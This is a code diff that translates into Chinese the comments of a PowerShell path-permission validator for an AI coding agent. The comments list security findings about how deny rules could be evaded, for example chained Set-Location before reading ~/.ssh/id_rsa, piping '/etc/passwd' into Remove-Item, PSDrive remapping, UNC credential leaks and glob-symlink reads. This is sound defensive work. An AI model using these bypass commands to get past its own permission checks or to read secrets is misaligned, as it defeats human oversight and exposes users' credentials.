+    // 重定向目标。对多数特殊转义（`n → n）来说剥离是空操作，但没关系——
+    // 猜测错误 → 无 deny 匹配 → 回退到 ask。
     const backtickStripped = normalizedPath.replace(/`/g, '')
     const denyHit = checkDenyRuleForGuessedPath(
       backtickStripped,
@@ -1055,21 +1040,21 @@ function validatePath(
       decisionReason: {
         type: 'other',
         reason:
-          'Backtick escape characters in paths cannot be statically validated and require manual approval',
+          '路径中的反引号转义字符无法静态校验，需要人工审批',
       },
     }
   }
 
-  // SECURITY: Block module-qualified provider paths. PowerShell allows
-  // `Microsoft.PowerShell.Core\FileSystem::/etc/passwd` which resolves to
-  // `/etc/passwd` via the FileSystem provider. The `::` is the provider
-  // path separator and doesn't match the simple `^[a-z]{2,}:` regex.
+  // 安全：阻止模块限定的 provider 路径。PowerShell 允许
+  // `Microsoft.PowerShell.Core\FileSystem::/etc/passwd`，它通过 FileSystem
+  // provider 解析为 `/etc/passwd`。`::` 是 provider 路径分隔符，
+  // 与简单的 `^[a-z]{2,}:` 正则不匹配。
   if (normalizedPath.includes('::')) {
-    // Strip everything up to and including the first :: — handles both
-    // FileSystem::/path and Microsoft.PowerShell.Core\FileSystem::/path.
-    // Double-:: (Foo::Bar::/x) strips first only → 'Bar::/x' → resolve
-    // makes it {cwd}/Bar::/x → won't match real deny rules → falls to ask.
-    // Safe.
+    // 剥离到第一个 :: 为止的全部内容——同时处理 FileSystem::/path 和
+    // Microsoft.PowerShell.Core\FileSystem::/path 两种形式。
+    // 双 ::（Foo::Bar::/x）只剥离第一个 → 'Bar::/x' → resolve
+    // 使其变为 {cwd}/Bar::/x → 不会匹配真实 deny 规则 → 回退到 ask。
+    // 安全。
     const afterProvider = normalizedPath.slice(normalizedPath.indexOf('::') + 2)
     const denyHit = checkDenyRuleForGuessedPath(
       afterProvider,
@@ -1090,13 +1075,12 @@ function validatePath(
       decisionReason: {
         type: 'other',
         reason:
-          'Module-qualified provider paths (::) cannot be statically validated and require manual approval',
+          '模块限定的 provider 路径（::）无法静态校验，需要人工审批',
       },
     }
   }
 
-  // SECURITY: Block UNC paths — they can trigger network requests and
-  // leak NTLM/Kerberos credentials
+  // 安全：阻止 UNC 路径——它们会触发网络请求并可能泄露 NTLM/Kerberos 凭据
   if (
     normalizedPath.startsWith('//') ||
     /DavWWWRoot/i.test(normalizedPath) ||
@@ -1108,43 +1092,43 @@ function validatePath(
       decisionReason: {
         type: 'other',
         reason:
-          'UNC paths are blocked because they can trigger network requests and credential leakage',
+          'UNC 路径已被阻止，因为它们可能触发网络请求和凭据泄露',
       },
     }
   }
 
-  // SECURITY: Reject paths containing shell expansion syntax
+  // 安全：拒绝包含 shell 展开语法的路径
   if (normalizedPath.includes('$') || normalizedPath.includes('%')) {
     return {
       allowed: false,
       resolvedPath: normalizedPath,
       decisionReason: {
         type: 'other',
-        reason: 'Variable expansion syntax in paths requires manual approval',
+        reason: '路径中的变量展开语法需要人工审批',
       },
     }
   }
 
-  // SECURITY: Block non-filesystem provider paths (env:, HKLM:, alias:, function:, etc.)
-  // These paths access non-filesystem resources and must require manual approval.
-  // This catches colon-syntax like -Path:env:HOME where the extracted value is 'env:HOME'.
+  // 安全：阻止非文件系统 provider 路径（env:、HKLM:、alias:、function: 等）
+  // 这些路径访问非文件系统资源，必须要求人工审批。
+  // 这会捕获冒号语法，如 -Path:env:HOME，其中提取出的值是 'env:HOME'。
   //
-  // Platform split (findings #21/#28):
-  // - Windows: require 2+ letters before ':' so native drive letters (C:, D:)
-  //   pass through to path.win32.isAbsolute/resolve which handle them correctly.
-  // - POSIX: ANY <letters>: prefix is a PowerShell PSDrive — single-letter drive
-  //   paths have no native meaning on Linux/macOS. `New-PSDrive -Name Z -Root /etc`
-  //   then `Get-Content Z:/secrets` would otherwise resolve via
-  //   path.posix.resolve(cwd, 'Z:/secrets') → '{cwd}/Z:/secrets' → inside cwd →
-  //   allowed, bypassing Read(/etc/**) deny rules. We cannot statically know what
-  //   filesystem root a PSDrive maps to, so treat all drive-prefixed paths on
-  //   POSIX as unvalidatable.
-  // Include digits in PSDrive name (bug #23): `New-PSDrive -Name 1 ...`
-  // creates drive `1:` — a valid PSDrive path prefix.
-  // Windows regex requires 2+ chars to exclude single-letter native drive letters
-  // (C:, D:). Use a single character class [a-z0-9] to catch mixed alphanumeric
-  // PSDrive names like `a1:`, `1a:` — the previous alternation `[a-z]{2,}|[0-9]+`
-  // missed those since `a1` is neither pure letters nor pure digits.
+  // 平台拆分（发现 #21/#28）：
+  // - Windows：要求 ':' 前至少 2 个字母，这样原生盘符（C:、D:）
+  //   能交给 path.win32.isAbsolute/resolve 正确处理。
+  // - POSIX：【任何】<字母>: 前缀都是 PowerShell PSDrive——单字母盘符
+  //   在 Linux/macOS 上没有任何原生含义。`New-PSDrive -Name Z -Root /etc`
+  //   然后 `Get-Content Z:/secrets` 否则会通过
+  //   path.posix.resolve(cwd, 'Z:/secrets') → '{cwd}/Z:/secrets' → 位于 cwd 内 →
+  //   放行，从而绕过 Read(/etc/**) deny 规则。我们无法静态知道一个 PSDrive
+  //   映射到哪个文件系统根，因此在 POSIX 上把所有带盘符前缀的路径都视为
+  //   无法校验。
+  // 在 PSDrive 名称中包含数字（缺陷 #23）：`New-PSDrive -Name 1 ...`
+  // 会创建 `1:` 这个盘——一个有效的 PSDrive 路径前缀。
+  // Windows 正则要求 2+ 个字符，以排除单字母的原生盘符（C:、D:）。
+  // 使用单一字符类 [a-z0-9] 来捕获混合字母数字的 PSDrive 名称，如
+  // `a1:`、`1a:`——之前的 `[a-z]{2,}|[0-9]+` 分类会漏掉这些，因为
+  // `a1` 既非纯字母也非纯数字。
   const providerPathRegex =
     getPlatform() === 'windows' ? /^[a-z0-9]{2,}:/i : /^[a-z0-9]+:/i
   if (providerPathRegex.test(normalizedPath)) {
@@ -1153,12 +1137,12 @@ function validatePath(
       resolvedPath: normalizedPath,
       decisionReason: {
         type: 'other',
-        reason: `Path '${normalizedPath}' uses a non-filesystem provider and requires manual approval`,
+        reason: `路径 '${normalizedPath}' 使用了非文件系统 provider，需要人工审批`,
       },
     }
   }
 
-  // SECURITY: Block glob patterns in write/create operations
+  // 安全：阻止写/创建操作中的 glob 模式
   if (GLOB_PATTERN_REGEX.test(normalizedPath)) {
     if (operationType === 'write' || operationType === 'create') {
       return {
@@ -1167,14 +1151,14 @@ function validatePath(
         decisionReason: {
           type: 'other',
           reason:
-            'Glob patterns are not allowed in write operations. Please specify an exact file path.',
+            '写操作中不允许使用 glob 模式。请指定确切的文件路径。',
         },
       }
     }
 
-    // For read operations with path traversal (e.g., /project/*/../../../etc/shadow),
-    // resolve the full path (including glob chars) and validate that resolved path.
-    // This catches patterns that escape the working directory via `..` after the glob.
+    // 对于带路径穿越的读取操作（例如 /project/*/../../../etc/shadow），
+    // 解析完整路径（含 glob 字符）并校验该解析结果。
+    // 这会捕获在 glob 之后通过 `..` 逃逸工作目录的模式。
     if (containsPathTraversal(normalizedPath)) {
       const absolutePath = isAbsolute(normalizedPath)
         ? normalizedPath
@@ -1196,18 +1180,18 @@ function validatePath(
       }
     }
 
-    // SECURITY (finding #15): Glob patterns for read operations cannot be
-    // statically validated. getGlobBaseDirectory returns the directory before
-    // the first glob char; only that base is realpathed. Anything matched by
-    // the glob (including symlinks) is never examined. Example:
-    //   /project/*/passwd with symlink /project/link → /etc
-    // Base dir is /project (allowed), but runtime expands * to 'link' and
-    // reads /etc/passwd. We cannot validate symlinks inside glob expansion
-    // without actually expanding the glob (requires filesystem access and
-    // still races with attacker creating symlinks post-validation).
+    // 安全（发现 #15）：读取操作的 glob 模式无法静态校验。
+    // getGlobBaseDirectory 返回第一个 glob 字符之前的目录；只有该基准
+    // 会被 realpath。glob 匹配到的任何内容（含符号链接）都不会被检查。
+    // 例如：
+    //   /project/*/passwd，其中符号链接 /project/link → /etc
+    // 基准目录是 /project（允许），但运行时会把 * 展开为 'link' 并读取
+    // /etc/passwd。如果不实际展开 glob（需要文件系统访问，且仍会与
+    // 攻击者在校验后创建符号链接形成竞态），我们无法校验 glob 展开内的
+    // 符号链接。
     //
-    // Still check deny rules on the base directory so explicit Read(/project/**)
-    // deny rules fire. If no deny matches, force ask.
+    // 仍然在基准目录上检查 deny 规则，使显式的 Read(/project/**) deny
+    // 规则得以触发。如果没有 deny 匹配，则强制 ask。
     const basePath = getGlobBaseDirectory(normalizedPath)
     const absoluteBasePath = isAbsolute(basePath)
       ? basePath
@@ -1236,12 +1220,12 @@ function validatePath(
       decisionReason: {
         type: 'other',
         reason:
-          'Glob patterns in paths cannot be statically validated — symlinks inside the glob expansion are not examined. Requires manual approval.',
+          '路径中的 glob 模式无法静态校验——glob 展开内的符号链接不会被检查。需要人工审批。',
       },
     }
   }
 
-  // Resolve path
+  // 解析路径
   const absolutePath = isAbsolute(normalizedPath)
     ? normalizedPath
     : resolve(cwd, normalizedPath)
@@ -1278,28 +1262,27 @@ function getGlobBaseDirectory(filePath: string): string {
 }
 
 /**
- * Element types that are safe to extract as literal path strings.
+ * 可安全提取为字面路径字符串的元素类型。
  *
- * Only element types with statically-known string values are safe for path
- * extraction. Variable and ExpandableString have runtime-determined values —
- * even though they're defended downstream ($ detection in validatePath's
- * `includes('$')` check, and the hasExpandableStrings security flag), excluding
- * them here is defense-in-direct: fail-safe at the earliest gate rather than
- * relying on downstream checks to catch them.
+ * 只有值可静态得知的元素类型才适合做路径提取。Variable 和
+ * ExpandableString 的值是在运行时决定的——即使它们在下游有防御
+ *（validatePath 的 `includes('$')` 检查中的 $ 检测，以及
+ * hasExpandableStrings 安全标志），在这里排除它们仍属于直接防御：
+ * 在最早的门槛上就失败安全，而不是依赖下游检查来捕获。
  *
- * Any other type (e.g., 'Other' for ArrayLiteralExpressionAst, 'SubExpression',
- * 'ScriptBlock', 'Variable', 'ExpandableString') cannot be statically validated
- * and must force an ask.
+ * 任何其他类型（例如数组字面量的 'Other'、'SubExpression'、
+ * 'ScriptBlock'、'Variable'、'ExpandableString'）都无法静态校验，
+ * 必须强制 ask。
  */
 const SAFE_PATH_ELEMENT_TYPES = new Set<string>(['StringConstant', 'Parameter'])
 
 /**
- * Extract file paths from a parsed PowerShell command element.
- * Uses the AST args to find positional and named path parameters.
+ * 从解析后的 PowerShell 命令元素中提取文件路径。
+ * 使用 AST 参数查找位置参数和命名路径参数。
  *
- * If any path argument has a complex elementType (e.g., array literal,
- * subexpression) that cannot be statically validated, sets
- * hasUnvalidatablePathArg so the caller can force an ask.
+ * 如果任何路径参数的 elementType 较复杂（例如数组字面量、
+ * 子表达式），无法静态校验，则设置 hasUnvalidatablePathArg，让调用方
+ * 能够强制 ask。
  */
 function extractPathsFromCommand(cmd: ParsedCommandElement): {
   paths: string[]
@@ -1319,13 +1302,13 @@ function extractPathsFromCommand(cmd: ParsedCommandElement): {
     }
   }
 
-  // Build per-cmdlet known-param sets, merging in common parameters.
+  // 构建每个 cmdlet 的已知参数集合，合并公共参数。
   const switchParams = [...config.knownSwitches, ...COMMON_SWITCHES]
   const valueParams = [...config.knownValueParams, ...COMMON_VALUE_PARAMS]
 
   const paths: string[] = []
   const args = cmd.args
-  // elementTypes[0] is the command name; elementTypes[i+1] corresponds to args[i]
+  // elementTypes[0] 是命令名；elementTypes[i+1] 对应 args[i]
   const elementTypes = cmd.elementTypes
   let hasUnvalidatablePathArg = false
   let positionalsSeen = 0
@@ -1339,36 +1322,36 @@ function extractPathsFromCommand(cmd: ParsedCommandElement): {
     }
   }
 
-  // Extract named parameter values (e.g., -Path "C:\foo")
+  // 提取命名参数值（例如 -Path "C:\foo"）
   for (let i = 0; i < args.length; i++) {
     const arg = args[i]
     if (!arg) continue
 
-    // Check if this arg is a parameter name.
-    // SECURITY: Use elementTypes as ground truth. PowerShell's tokenizer
-    // accepts en-dash/em-dash/horizontal-bar (U+2013/2014/2015) as parameter
-    // prefixes; a raw startsWith('-') check misses `–Path` (en-dash). The
-    // parser maps CommandParameterAst → 'Parameter' regardless of dash char.
-    // isPowerShellParameter also correctly rejects quoted "-Include"
-    // (StringConstant, not a parameter).
+    // 检查该参数是否为参数名。
+    // 安全：把 elementTypes 当作基准事实。PowerShell 的词法分析器
+    // 接受 en-dash/em-dash/horizontal-bar（U+2013/2014/2015）作为参数
+    // 前缀；裸露的 startsWith('-') 检查会漏掉 `–Path`（en-dash）。
+    // 无论破折号字符如何，解析器都会把 CommandParameterAst 映射为
+    // 'Parameter'。isPowerShellParameter 也能正确拒绝带引号的
+    // "-Include"（是 StringConstant，不是参数）。
     const argElementType = elementTypes ? elementTypes[i + 1] : undefined
     if (isPowerShellParameter(arg, argElementType)) {
-      // Handle colon syntax: -Path:C:\secret
-      // Normalize Unicode dash to ASCII `-` (pathParams are stored with `-`).
+      // 处理冒号语法：-Path:C:\secret
+      // 将 Unicode 破折号归一化为 ASCII `-`（pathParams 都以 `-` 存储）。
       const normalized = '-' + arg.slice(1)
-      const colonIdx = normalized.indexOf(':', 1) // skip first char (the dash)
+      const colonIdx = normalized.indexOf(':', 1) // 跳过第一个字符（破折号）
       const paramName =
         colonIdx > 0 ? normalized.substring(0, colonIdx) : normalized
       const paramLower = paramName.toLowerCase()
 
       if (matchesParam(paramLower, config.pathParams)) {
-        // Known path parameter — extract its value as a path.
+        // 已知路径参数——将它的值提取为路径。
         let value: string | undefined
         if (colonIdx > 0) {
-          // Colon syntax: -Path:value — the whole thing is one element.
-          // SECURITY: comma-separated values (e.g., -Path:safe.txt,/etc/passwd)
-          // produce ArrayLiteralExpressionAst inside the CommandParameterAst.
-          // PowerShell writes to ALL paths, but we see a single string.
+          // 冒号语法：-Path:value —— 整个结构是一个元素。
+          // 安全：逗号分隔的值（例如 -Path:safe.txt,/etc/passwd）会在
+          // CommandParameterAst 内部产生 ArrayLiteralExpressionAst。
+          // PowerShell 会写入【所有】路径，但我们只看到单个字符串。
           const rawValue = arg.substring(colonIdx + 1)
           if (hasComplexColonValue(rawValue)) {
             hasUnvalidatablePathArg = true
@@ -1376,13 +1359,13 @@ function extractPathsFromCommand(cmd: ParsedCommandElement): {
             value = rawValue
           }
         } else {
-          // Standard syntax: -Path value
+          // 标准语法：-Path value
           const nextVal = args[i + 1]
           const nextType = elementTypes ? elementTypes[i + 2] : undefined
           if (nextVal && !isPowerShellParameter(nextVal, nextType)) {
             value = nextVal
             checkArgElementType(i + 1)
-            i++ // Skip the value
+            i++ // 跳过该值
           }
         }
         if (value) {
@@ -1392,12 +1375,11 @@ function extractPathsFromCommand(cmd: ParsedCommandElement): {
         config.leafOnlyPathParams &&
         matchesParam(paramLower, config.leafOnlyPathParams)
       ) {
-        // Leaf-only path parameter (e.g., New-Item -Name). PowerShell resolves
-        // this relative to ANOTHER parameter (-Path), not cwd. validatePath
-        // resolves against cwd (L930), so non-leaf values (separators,
-        // traversal) resolve to the WRONG location and can miss deny rules
-        // (deny→ask downgrade). Extract simple leaf filenames; flag anything
-        // path-like.
+        // 叶子限定的路径参数（例如 New-Item -Name）。PowerShell 相对
+        //【另一个】参数（-Path）而非 cwd 解析它。validatePath 相对 cwd
+        // 解析（L930），因此非叶子值（分隔符、穿越）会解析到【错误】的位置，
+        // 并可能漏掉 deny 规则（deny→ask 降级）。提取简单叶子文件名；
+        // 任何类似路径的内容都会被标记。
         let value: string | undefined
         if (colonIdx > 0) {
           const rawValue = arg.substring(colonIdx + 1)
@@ -1422,32 +1404,32 @@ function extractPathsFromCommand(cmd: ParsedCommandElement): {
             value === '.' ||
             value === '..'
           ) {
-            // Non-leaf: separators or traversal. Can't resolve correctly
-            // without joining against -Path. Force ask.
+            // 非叶子：含分隔符或穿越。在不与 -Path 拼接的前提下无法正确
+            // 解析。强制 ask。
             hasUnvalidatablePathArg = true
           } else {
-            // Simple leaf: extract. Resolves to cwd/leaf (slightly wrong —
-            // should be <-Path>/leaf) but -Path extraction covers the
-            // directory, and a leaf filename can't traverse out of anywhere.
+            // 简单叶子：提取。解析为 cwd/leaf（略有偏差——应当是
+            // <-Path>/leaf），但 -Path 提取已覆盖目录，且叶子文件名
+            // 无法从任何位置穿越出去。
             paths.push(value)
           }
         }
       } else if (matchesParam(paramLower, switchParams)) {
-        // Known switch parameter — takes no value, do NOT consume next arg.
-        // (Colon syntax on a switch, e.g., -Confirm:$false, is self-contained
-        // in one token and correctly falls through here without consuming.)
+        // 已知开关参数——不取值，不要消费下一个参数。
+        //（开关上的冒号语法，如 -Confirm:$false，自包含在单个 token 中，
+        // 会在此处正确通过而不消费值。）
       } else if (matchesParam(paramLower, valueParams)) {
-        // Known value-taking non-path parameter (e.g., -Encoding UTF8, -Filter *.txt).
-        // Consume its value; do NOT validate as path, but DO check elementType.
-        // SECURITY: A Variable elementType (e.g., $env:LIMKENION_API_KEY) in any
-        // argument position means the runtime value is not statically knowable.
-        // Without this check, `-Value $env:SECRET` would be silently auto-allowed
-        // in acceptEdits mode because the Variable elementType was never examined.
+        // 已知的取值非路径参数（例如 -Encoding UTF8、-Filter *.txt）。
+        // 消费其值；不要当作路径校验，但要检查 elementType。
+        // 安全：任何参数位置出现 Variable elementType（例如
+        // $env:LIMKENION_API_KEY）都意味着运行时值无法静态得知。
+        // 没有此检查，`-Value $env:SECRET` 会在 acceptEdits 模式下被静默
+        // 自动放行，因为 Variable elementType 从未被检查。
         if (colonIdx > 0) {
-          // Colon syntax: -Value:$env:FOO — the value is embedded in the token.
-          // The outer CommandParameterAst 'Parameter' type masks the inner
-          // expression type. Check for expression markers that indicate a
-          // non-static value (mirrors pathParams colon-syntax guards).
+          // 冒号语法：-Value:$env:FOO —— 值内嵌在 token 中。
+          // 外层 CommandParameterAst 的 'Parameter' 类型会掩盖内层
+          // 表达式的类型。检查是否存在指示非静态值的表达式标记
+          //（与 pathParams 的冒号语法守卫一致）。
           const rawValue = arg.substring(colonIdx + 1)
           if (hasComplexColonValue(rawValue)) {
             hasUnvalidatablePathArg = true
@@ -1457,39 +1439,37 @@ function extractPathsFromCommand(cmd: ParsedCommandElement): {
           const nextArgType = elementTypes ? elementTypes[i + 2] : undefined
           if (nextArg && !isPowerShellParameter(nextArg, nextArgType)) {
             checkArgElementType(i + 1)
-            i++ // Skip the parameter's value
+            i++ // 跳过该参数的值
           }
         }
       } else {
-        // Unknown parameter — we do not understand this invocation.
-        // SECURITY: This is the structural fix for the KNOWN_SWITCH_PARAMS
-        // whack-a-mole. Rather than guess whether this param is a switch
-        // (and risk swallowing a positional path) or takes a value (and
-        // risk the same), we flag the whole command as unvalidatable.
-        // The caller will force an ask.
+        // 未知参数——我们无法理解这次调用。
+        // 安全:这是对 KNOWN_SWITCH_PARAMS "打地鼠"问题的结构性修复。
+        // 与其猜测该参数是开关（并冒着吞掉位置路径的风险）还是取值
+        //（同样有风险），不如把整条命令标记为无法校验。
+        // 调用方将强制 ask。
         hasUnvalidatablePathArg = true
-        // SECURITY: Even though we don't recognize this param, if it uses
-        // colon syntax (-UnknownParam:/etc/hosts) the bound value might be
-        // a filesystem path. Extract it into paths[] so deny-rule matching
-        // still runs. Without this, the value is trapped inside the single
-        // token and paths=[] means deny rules are never consulted —
-        // downgrading deny to ask. This is defense-in-depth: the primary
-        // fix is adding all known aliases to pathParams above.
+        // 安全：即使我们不识别该参数，如果它使用了冒号语法
+        // （-UnknownParam:/etc/hosts），其绑定的值可能是文件系统路径。
+        // 仍把它提取进 paths[]，让 deny 规则匹配得以运行。否则该值会被
+        // 困在单个 token 内，paths=[] 意味着 deny 规则永不参与——
+        // 把 deny 降级为 ask。这是纵深防御：主要修复是把所有已知别名
+        // 都加到上面的 pathParams 中。
         if (colonIdx > 0) {
           const rawValue = arg.substring(colonIdx + 1)
           if (!hasComplexColonValue(rawValue)) {
             paths.push(rawValue)
           }
         }
-        // Continue the loop so we still extract any recognizable paths
-        // (useful for the ask message), but the flag ensures overall 'ask'.
+        // 继续循环，这样我们仍能提取任何可识别的路径
+        //（对 ask 消息有用），但该标志保证整体是 ask。
       }
       continue
     }
 
-    // Positional arguments: extract as paths (e.g., Get-Content file.txt)
-    // The first positional arg is typically the source path.
-    // Skip leading positionals that are non-path values (e.g., iwr's -Uri).
+    // 位置参数：作为路径提取（例如 Get-Content file.txt）
+    // 第一个位置参数通常是源路径。
+    // 跳过作为非路径值的前导位置参数（例如 iwr 的 -Uri）。
     if (positionalsSeen < positionalSkip) {
       positionalsSeen++
       continue
@@ -1508,22 +1488,20 @@ function extractPathsFromCommand(cmd: ParsedCommandElement): {
 }
 
 /**
- * Checks path constraints for PowerShell commands.
- * Extracts file paths from the parsed AST and validates they are
- * within allowed directories.
+ * 检查 PowerShell 命令的路径约束。
+ * 从解析后的 AST 中提取文件路径，并校验它们都在允许的目录内。
  *
- * @param compoundCommandHasCd - Whether the full compound command contains a
- *   cwd-changing cmdlet (Set-Location/Push-Location/Pop-Location/New-PSDrive,
- *   excluding no-op Set-Location-to-CWD). When true, relative paths in ANY
- *   statement cannot be trusted — PowerShell executes statements sequentially
- *   and a cd in statement N changes the cwd for statement N+1, but this
- *   validator resolves all paths against the stale Node process cwd.
- *   BashTool parity (BashTool/pathValidation.ts:630-655).
+ * @param compoundCommandHasCd - 整个复合命令是否包含改变 cwd 的 cmdlet
+ * （Set-Location/Push-Location/Pop-Location/New-PSDrive，排除 Set-Location
+ * 到当前目录这种空操作）。为 true 时，任何语句中的相对路径都不可信——
+ * PowerShell 按顺序执行语句，语句 N 中的 cd 会改变语句 N+1 的 cwd，但
+ * 本校验器是用过期的 Node 进程 cwd 解析所有路径的。
+ * 与 BashTool 对齐（BashTool/pathValidation.ts:630-655）。
  *
  * @returns
- * - 'ask' if any path command tries to access outside allowed directories
- * - 'deny' if a deny rule explicitly blocks the path
- * - 'passthrough' if no path commands were found or all paths are valid
+ * - 若任何路径命令尝试访问允许目录之外，返回 'ask'
+ * - 若 deny 规则显式阻止了路径，返回 'deny'
+ * - 若未发现路径命令或所有路径都有效，返回 'passthrough'
  */
 export function checkPathConstraints(
   input: { command: string },
@@ -1534,14 +1512,13 @@ export function checkPathConstraints(
   if (!parsed.valid) {
     return {
       behavior: 'passthrough',
-      message: 'Cannot validate paths for unparsed command',
+      message: '无法对未解析的命令校验路径',
     }
   }
 
-  // SECURITY: Two-pass approach — check ALL statements/paths so deny rules
-  // always take precedence over ask. Without this, an ask on statement 1
-  // could return before checking statement 2 for deny rules, letting the
-  // user approve a command that includes a denied path.
+  // 安全：两遍处理——检查【所有】语句/路径，使 deny 规则始终优先于 ask。
+  // 否则，语句 1 上的 ask 可能在检查语句 2 的 deny 规则之前就返回，
+  // 从而让用户批准一条包含被拒绝路径的命令。
   let firstAsk: PermissionResult | undefined
 
   for (const statement of parsed.statements) {
@@ -1561,7 +1538,7 @@ export function checkPathConstraints(
   return (
     firstAsk ?? {
       behavior: 'passthrough',
-      message: 'All path constraints validated successfully',
+      message: '所有路径约束均已成功校验',
     }
   )
 }
@@ -1574,63 +1551,58 @@ function checkPathConstraintsForStatement(
   const cwd = getCwd()
   let firstAsk: PermissionResult | undefined
 
-  // SECURITY: BashTool parity — block path operations in compound commands
-  // containing a cwd-changing cmdlet (BashTool/pathValidation.ts:630-655).
+  // 安全：与 BashTool 对齐——阻止包含改变 cwd 的 cmdlet 的复合命令中的
+  // 路径操作（BashTool/pathValidation.ts:630-655）。
   //
-  // When the compound contains Set-Location/Push-Location/Pop-Location/
-  // New-PSDrive, relative paths in later statements resolve against the
-  // CHANGED cwd at runtime, but this validator resolves them against the
-  // STALE getCwd() snapshot. Example attack (finding #3):
+  // 当复合命令包含 Set-Location/Push-Location/Pop-Location/New-PSDrive 时，
+  // 后续语句中的相对路径在运行时相对【已改变】的 cwd 解析，但本校验器是
+  // 用【过期的】getCwd() 快照解析的。攻击示例（发现 #3）：
   //   Set-Location ./.limkenion; Set-Content ./settings.json '...'
-  // Validator sees ./settings.json → /project/settings.json (not a config file).
-  // Runtime writes /project/.limkenion/settings.json (Limkenion's permission config).
+  // 校验器看到 ./settings.json → /project/settings.json（不是配置文件）。
+  // 运行时写入 /project/.limkenion/settings.json（Limkenion 的权限配置）。
   //
-  // ALTERNATIVE APPROACH (rejected): simulate cwd through the statement chain
-  // — after `Set-Location ./.limkenion`, validate subsequent statements with
-  // cwd='./.limkenion'. This would be more permissive but requires careful
-  // handling of:
-  //   - Push-Location/Pop-Location stack semantics
-  //   - Set-Location with no args (→ home on some platforms)
-  //   - New-PSDrive root mapping (arbitrary filesystem root)
-  //   - Conditional/loop statements where cd may or may not execute
-  //   - Error cases where the cd target can't be statically determined
-  // For now we take the conservative approach of requiring manual approval.
+  //【已否决】的替代方案：沿语句链模拟 cwd——在 `Set-Location ./.limkenion`
+  // 之后，用 cwd='./.limkenion' 校验后续语句。这会更加宽松，但需要仔细处理：
+  //   - Push-Location/Pop-Location 的栈语义
+  //   - 无参数的 Set-Location（某些平台 → home）
+  //   - New-PSDrive 根映射（任意文件系统根）
+  //   - 条件/循环语句中 cd 可能执行也可能不执行
+  //   - cd 目标无法静态确定时的错误情况
+  // 目前我们采用要求人工审批的保守做法。
   //
-  // Unlike BashTool which gates on `operationType !== 'read'`, we also block
-  // READS (finding #27): `Set-Location ~; Get-Content ./.ssh/id_rsa` bypasses
-  // Read(~/.ssh/**) deny rules because the validator matched the deny against
-  // /project/.ssh/id_rsa. Reads from mis-resolved paths leak data just as
-  // writes destroy it. We still run deny-rule matching below (via firstAsk,
-  // not early return) so explicit deny rules on the stale-resolved path are
-  // honored — deny > ask in the caller's reduce.
+  // 与 BashTool 以 `operationType !== 'read'` 为门槛不同，我们也阻止【读取】
+  //（发现 #27）：`Set-Location ~; Get-Content ./.ssh/id_rsa` 能绕过
+  // Read(~/.ssh/**) deny 规则，因为校验器是把 deny 与 /project/.ssh/id_rsa
+  // 匹配的。从错误解析路径进行的读取就像写入会摧毁数据一样会泄露数据。
+  // 我们在下面仍然运行 deny 规则匹配（通过 firstAsk，而非提前返回），
+  // 因此过期解析路径上的显式 deny 规则仍会被遵守——在调用方的归约中
+  // deny > ask。
   if (compoundCommandHasCd) {
     firstAsk = {
       behavior: 'ask',
       message:
-        'Compound command changes working directory (Set-Location/Push-Location/Pop-Location/New-PSDrive) — relative paths cannot be validated against the original cwd and require manual approval',
+        '复合命令会改变工作目录（Set-Location/Push-Location/Pop-Location/New-PSDrive）——相对路径无法相对原始 cwd 校验，需要人工审批',
       decisionReason: {
         type: 'other',
         reason:
-          'Compound command contains cd with path operation — manual approval required to prevent path resolution bypass',
+          '复合命令包含带路径操作的 cd——需要人工审批以防止路径解析绕过',
       },
     }
   }
 
-  // SECURITY: Track whether this statement contains a non-CommandAst pipeline
-  // element (string literal, variable, array expression). PowerShell pipes
-  // these values to downstream cmdlets, often binding to -Path. Example:
-  // `'/etc/passwd' | Remove-Item` — the string is piped to Remove-Item's -Path,
-  // but Remove-Item has no explicit args so extractPathsFromCommand returns
-  // zero paths and the command would passthrough. If ANY downstream cmdlet
-  // appears alongside an expression source, we force an ask — the piped
-  // path is unvalidatable regardless of operation type (reads leak data;
-  // writes destroy it).
+  // 安全：跟踪此语句是否包含非 CommandAst 的管道元素（字符串字面量、
+  // 变量、数组表达式）。PowerShell 会将这些值管道给下游 cmdlet，常绑定到
+  // -Path。示例：`'/etc/passwd' | Remove-Item` —— 字符串被管道给
+  // Remove-Item 的 -Path，但 Remove-Item 没有显式参数，因此
+  // extractPathsFromCommand 返回零个路径，命令会 passthrough。
+  // 如果【任何】下游 cmdlet 与表达式源并存，我们强制 ask——无论操作类型
+  // 如何，被管道的路径都无法校验（读取泄露数据；写入摧毁它）。
   let hasExpressionPipelineSource = false
-  // Track the non-CommandAst element's text for deny-rule guessing (finding #23).
-  // `'.git/hooks/pre-commit' | Remove-Item` — path comes via pipeline, paths=[]
-  // from extractPathsFromCommand, so the deny loop below never iterates. We
-  // feed the pipeline-source text through checkDenyRuleForGuessedPath so
-  // explicit Edit(.git/**) deny rules still fire.
+  // 跟踪非 CommandAst 元素的文本，用于 deny 规则猜测（发现 #23）。
+  // `'.git/hooks/pre-commit' | Remove-Item` —— 路径经管道传入，paths=[]
+  //（来自 extractPathsFromCommand），因此下面的 deny 循环永远不会迭代。
+  // 我们把管道源文本交给 checkDenyRuleForGuessedPath，使显式的
+  // Edit(.git/**) deny 规则仍能触发。
   let pipelineSourceText: string | undefined
 
   for (const cmd of statement.commands) {
@@ -1643,19 +1615,17 @@ function checkPathConstraintsForStatement(
     const { paths, operationType, hasUnvalidatablePathArg, optionalWrite } =
       extractPathsFromCommand(cmd)
 
-    // SECURITY: Cmdlet receiving piped path from expression source.
-    // `'/etc/shadow' | Get-Content` — Get-Content extracts zero paths
-    // (no explicit args). The path comes from the pipeline, which we cannot
-    // statically validate. Previously exempted reads (`operationType !== 'read'`),
-    // but that was a bypass (review comment 2885739292): reads from
-    // unvalidatable paths are still a security risk. Ask regardless of op type.
+    // 安全：接收来自表达式源管道路径的 cmdlet。
+    // `'/etc/shadow' | Get-Content` —— Get-Content 提取零个路径
+    //（没有显式参数）。路径来自管道，无法静态校验。以前会对读取豁免
+    //（`operationType !== 'read'`），但那是绕过（审查评论 2885739292）：
+    // 从无法校验的路径进行读取同样是安全风险。无论操作类型如何都 ask。
     if (hasExpressionPipelineSource) {
       const canonical = resolveToCanonical(cmd.name)
-      // SECURITY (finding #23): Before falling back to ask, check if the
-      // pipeline-source text matches a deny rule. `'.git/hooks/pre-commit' |
-      // Remove-Item` should DENY (not ask) when Edit(.git/**) is configured.
-      // Strip surrounding quotes (string literals are quoted in .text) and
-      // feed through the same deny-guess helper used for ::/backtick paths.
+      // 安全（发现 #23）：在回退到 ask 之前，检查管道源文本是否匹配 deny
